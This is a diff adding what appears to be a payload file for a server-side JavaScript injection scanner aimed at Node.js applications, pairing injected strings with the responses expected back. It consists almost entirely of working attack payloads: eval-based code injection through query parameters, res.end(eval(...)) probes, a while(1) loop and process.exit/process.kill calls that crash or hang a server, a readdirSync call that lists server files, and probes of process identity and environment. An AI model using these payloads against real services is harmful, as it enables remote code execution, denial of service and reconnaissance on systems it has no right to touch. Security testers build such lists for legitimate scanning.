@@ -1,0 +1,109 @@
+res.end("thats my payload -> 1 -> ***")
+thats my payload,1,$$$
+10
+10
+res.end(###)
+$$$
+response.end(###)
+$$$
+response.end("thats my payload -> 1 -> ***")
+thats my payload,1,$$$
+eval(***)
+$$$
+eval(###)
+$$$
+res.end("ReferenceError -> ***")
+$$$
+res.end(###)
+$$$
+res.end('***')
+$$$
+19999999999
+19999999999
+1
+1
+eval('###')
+$$$
+eval(###)
+$$$
+response.end(###)
+$$$
+response.end('***')
+$$$
+res.end('***')
+$$$
+10&roth=0&afterTax=0
+10
+---end
+---end
+10&roth=0&afterTax=0
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError:
+90&roth=0&afterTax=0
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError:
+10&roth=0&afterTax=0; var vuln='###';eval(vuln)
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError:,$$$
+res.end(eval('###'))
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError:,$$$
+res.end('***')
+ReferenceError: res is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+var%20vuln=###;eval(vuln)
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+eval(###)
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+eval('###')
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+res.end('12749485')
+ReferenceError: response is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,12749485
+res.end(***)
+ReferenceError: res is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+eval(###)
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+res.end(owned)
+ReferenceError: response is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,owned
+res.end(eval(1952833+10))
+ReferenceError: response is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,1952843
+res.end('eval(1952833+10)')
+ReferenceError: response is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,1952843
+rese.end('penetration'+eval(10+10)+'test')
+ReferenceError: response is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,penetration20test
+res.end('owned')
+ReferenceError: res is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,owned
+res.end(eval(1952833+10))
+ReferenceError: res is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,1952843
+res.end('penetration'+eval(10+10)+'test')
+ReferenceError: res is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,penetration20test
+res.end('***')
+ReferenceError: res is not defined,ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+---end
+---end
+eval("###")
+ReferenceError:,SyntaxError:,TypeError:,EvalError:,RangeError,$$$
+while(1)
+
+process.exit()
+
+process.kill(process.pid)
+
+res.end(require('fs').readdirSync('.').toString())
+
+process.arch
+
+process.argv
+
+process.argv0
+
+process.channel
+
+process.cwd()
+
+process.geteuid()
+
+process.getegid()
+
+process.getgroups()
+
+process.pid
+
+process.platform
+
+process.version
